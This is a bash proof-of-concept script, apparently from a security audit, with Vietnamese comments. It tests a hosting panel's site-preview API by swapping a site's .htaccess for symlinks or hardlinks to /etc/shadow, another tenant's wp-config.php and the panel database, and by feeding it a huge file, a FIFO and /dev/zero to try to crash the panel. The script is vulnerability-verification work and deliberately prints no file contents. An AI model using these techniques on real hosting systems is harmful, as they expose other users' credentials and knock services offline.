#!/usr/bin/env bash
# N1: tái hiện T1 và các biến thể qua đúng đường một chủ site thường gọi được:
# POST /api/v1/sites?dry_run=1 bằng phiên của khach1 (vai user). Cần N0 đã
# chạy với stack apache. Chạy bằng root trong máy ảo.
#
# Mỗi phép thử: user Linux của site e.example.com (tp_...) đặt thứ gì đó ở
# public/.htaccess của chính nó, rồi khach1 xin bản xem trước. Không in nội
# dung file nào; phan-tich.py chỉ in cỡ, sha256 rút gọn và kết luận.
#
# Tham số: "nhe" bỏ ba phép thử phá panel (file 2 GiB, FIFO, /dev/zero).
set -u
MODE="${1:-day-du}"
DOM=e.example.com
VICTIM=a.example.com
API=https://127.0.0.1:8443/api/v1
R=/home/ubuntu/m28
PUB=/var/www/$DOM/public
HT=$PUB/.htaccess
SU="$(stat -c '%U' "/var/www/$DOM")"
W="$(mktemp -d)"
jar="$W/jar"
resp="$W/resp"
umask 077

as() { runuser -u "$SU" -- "$@"; }
pid() { systemctl show -p MainPID --value tpan; }
rss() { ps -o rss= -p "$(pid)" 2>/dev/null | tr -d ' '; }

login() {
  python3 -c 'import json,sys; print(json.dumps({"name": sys.argv[1], "password": open(sys.argv[2]).read().strip()}))' \
    khach1 /root/m28-khach1.pw >"$W/login.json"
  curl -sk -c "$jar" -o /dev/null -w 'đăng nhập khach1: HTTP %{http_code}\n' -X POST "$API/login" \
    -H 'Content-Type: application/json' --data @"$W/login.json"
  curl -sk -b "$jar" "$API/session" | python3 -c 'import json,sys; u=json.load(sys.stdin)["user"]; print("phiên:", u["name"], "vai", u["role"])'
}

# dry <hạn giây>: gọi bản xem trước, in mã HTTP, thời gian và mã thoát của curl.
dry() {
  : >"$resp"
  local out rc
  out="$(timeout "$1" curl -sk -b "$jar" -o "$resp" -w '%{http_code} %{time_total}s' -X POST "$API/sites?dry_run=1" \
    -H 'Content-Type: application/json' --data "{\"domain\":\"$DOM\",\"email\":\"admin@$DOM\"}")"
  rc=$?
  echo "  bản xem trước: HTTP ${out:-(không có)} (curl thoát $rc; 124 là quá hạn ${1}s), câu trả lời $(wc -c <"$resp") byte"
  return $rc
}

song() {
  local p
  p="$(pid)"
  if [ "$p" != "$PID0" ] || [ "$(systemctl is-active tpan)" != active ]; then
    echo "  tpan: PID $PID0 -> ${p:-không còn}, $(systemctl is-active tpan), NRestarts=$(systemctl show -p NRestarts --value tpan)"
    return 1
  fi
  echo "  tpan còn sống (PID $p, RSS $(rss) KiB)"
}

doi_tpan() {
  for _ in $(seq 1 30); do
    [ "$(systemctl is-active tpan)" = active ] && curl -sk -o /dev/null "$API/health" && break
    sleep 1
  done
  PID0="$(pid)"
}

echo "site $DOM chạy bằng user Linux $SU; nạn nhân $VICTIM"
sysctl fs.protected_symlinks fs.protected_hardlinks
login
PID0="$(pid)"
echo "tpan PID $PID0, RSS $(rss) KiB"
as cp -a "$HT" "$W/htaccess.goc" 2>/dev/null || cp -a "$HT" "$W/htaccess.goc"
tra_lai() { as rm -rf "$HT"; cp -a "$W/htaccess.goc" "$HT"; chown "$SU":www-data "$HT"; chmod 0640 "$HT"; }

echo
echo "=== 0. .htaccess là file thường (hành vi đúng phải giữ) ==="
dry 30
python3 "$R/phan-tich.py" "$resp" "$HT" "thuong:.htaccess" "$HT"

n=0
for t in "/var/www/$VICTIM/public/wp-config.php" /etc/shadow /var/lib/tpan/tpan.db; do
  n=$((n + 1))
  echo
  echo "=== $n. .htaccess -> symlink tới $t ==="
  as ln -sfn "$t" "$HT"
  dry 60
  python3 "$R/phan-tich.py" "$resp" "$t" "symlink:$t" "$HT"
  song || doi_tpan
done
tra_lai

echo
echo "=== 4. thư mục cha: public -> symlink tới thư mục chỉ root đọc được ==="
mkdir -p /srv/m28/nan-nhan
chmod 700 /srv/m28 /srv/m28/nan-nhan
head -c 600 /dev/urandom | base64 >/srv/m28/nan-nhan/.htaccess
# Có sẵn wp-config.php ở thư mục nạn nhân (như public của một site khác):
# không có thì core từ chối sớm vì "site lệch", chưa tới chỗ đọc .htaccess.
cp "/var/www/$VICTIM/public/wp-config.php" /srv/m28/nan-nhan/wp-config.php
as mv "$PUB" "$PUB.that"
as ln -s /srv/m28/nan-nhan "$PUB"
dry 60
python3 "$R/phan-tich.py" "$resp" /srv/m28/nan-nhan/.htaccess "cha-la-symlink" "$HT"
as rm "$PUB"
as mv "$PUB.that" "$PUB"
song || doi_tpan

echo
echo "=== 5. hardlink tới /etc/shadow ==="
as rm -f "$HT"
if as ln /etc/shadow "$HT" 2>"$W/ln.err"; then
  echo "  ln thành công dù fs.protected_hardlinks=$(sysctl -n fs.protected_hardlinks)"
else
  echo "  ln bị kernel từ chối: $(cat "$W/ln.err")"
fi
echo "  tắt fs.protected_hardlinks (máy bị cấu hình lỏng) rồi thử lại"
sysctl -q -w fs.protected_hardlinks=0
if as ln /etc/shadow "$HT" 2>"$W/ln.err"; then
  stat -c '  %n: %F, chủ %U:%G, quyền %a, %h tên' "$HT"
  dry 60
  python3 "$R/phan-tich.py" "$resp" /etc/shadow "hardlink:/etc/shadow" "$HT"
else
  echo "  ln vẫn bị từ chối: $(cat "$W/ln.err")"
fi
sysctl -q -w fs.protected_hardlinks=1
tra_lai
song || doi_tpan

if [ "$MODE" != nhe ]; then
  echo
  echo "=== 6. .htaccess là file thường 2 GiB (thưa), đúng chủ và quyền ==="
  as rm -f "$HT"
  as truncate -s 2G "$HT"
  as chmod 0640 "$HT"
  stat -c '  %n: %s byte, chủ %U:%G, quyền %a' "$HT"
  dry 90
  python3 "$R/phan-tich.py" "$resp" - "file-2GiB" "$HT"
  song || doi_tpan

  echo
  echo "=== 7. .htaccess là FIFO ==="
  as rm -f "$HT"
  as mkfifo "$HT"
  dry 20
  python3 "$R/phan-tich.py" "$resp" - "fifo" "$HT"
  song || doi_tpan

  echo
  echo "=== 8. .htaccess -> symlink tới /dev/zero ==="
  as rm -f "$HT"
  as ln -sfn /dev/zero "$HT"
  dry 90
  python3 "$R/phan-tich.py" "$resp" - "dev-zero" "$HT"
  song || doi_tpan
  journalctl -k --since '-3 min' --no-pager 2>/dev/null | grep -iE 'out of memory|oom-kill' | tail -3
fi

echo
echo "=== dọn ==="
tra_lai
rm -rf /srv/m28/nan-nhan "$W"
ls -la "$HT"
systemctl is-active tpan
